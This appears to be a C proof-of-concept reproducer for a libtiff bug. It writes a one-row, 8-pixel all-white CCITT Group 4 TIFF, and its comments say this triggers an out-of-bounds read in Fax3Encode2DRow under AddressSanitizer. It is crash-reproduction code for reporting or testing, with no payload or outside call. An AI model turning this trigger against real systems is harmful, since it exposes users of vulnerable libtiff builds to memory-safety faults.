#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tiffio.h>

int main(void) {
    /* Create a minimal 1-bit image whose width is a multiple of 8 so that
     * b1 can legitimately become equal to bits. */
    const uint32_t width = 8;   /* multiple of 8 to hit the rp[b1 >> 3] + 1 byte */
    const uint32_t height = 1;  /* single row is enough for Group 4 (2D for all rows) */

    TIFF *tif = TIFFOpen("repro_fax4.tif", "w");
    if (!tif) {
        fprintf(stderr, "Failed to open output TIFF file\n");
        return 1;
    }

    /* Set up a CCITT Group 4 (T.6) encoder. Group 4 always uses 2D encoding,
     * so the first encoded row will use a reference line (rp) that is all white. */
    if (!TIFFSetField(tif, TIFFTAG_IMAGEWIDTH, width) ||
        !TIFFSetField(tif, TIFFTAG_IMAGELENGTH, height) ||
        !TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE, 1) ||
        !TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, 1) ||
        !TIFFSetField(tif, TIFFTAG_COMPRESSION, COMPRESSION_CCITTFAX4) ||
        !TIFFSetField(tif, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_MINISWHITE) ||
        !TIFFSetField(tif, TIFFTAG_ROWSPERSTRIP, 1) ||
        !TIFFSetField(tif, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG) ||
        !TIFFSetField(tif, TIFFTAG_FILLORDER, FILLORDER_MSB2LSB)) {
        fprintf(stderr, "Failed to set required TIFF tags\n");
        TIFFClose(tif);
        return 1;
    }

    const tsize_t scanlineSize = TIFFScanlineSize(tif);
    unsigned char *row = (unsigned char *)malloc((size_t)scanlineSize);
    if (!row) {
        fprintf(stderr, "malloc failed\n");
        TIFFClose(tif);
        return 1;
    }

    /* All-white scanline: MINISWHITE means 0-bit is white. The reference line (rp)
     * used by the encoder for the first row is also all white. With width == 8,
     * finddiff(rp, 0, bits, 0) returns bits (8), so b1 == bits. */
    memset(row, 0x00, (size_t)scanlineSize);

    /* This call triggers the vulnerable path inside Fax3Encode2DRow() used by
     * the Group 4 encoder. */
    if (TIFFWriteScanline(tif, row, 0, 0) < 0) {
        fprintf(stderr, "TIFFWriteScanline failed\n");
    }

    free(row);
    TIFFClose(tif);

    fprintf(stderr, "Wrote repro_fax4.tif. If linked against a vulnerable libtiff,\n");
    fprintf(stderr, "this should trigger an ASan out-of-bounds read in Fax3Encode2DRow.\n");
    return 0;
}
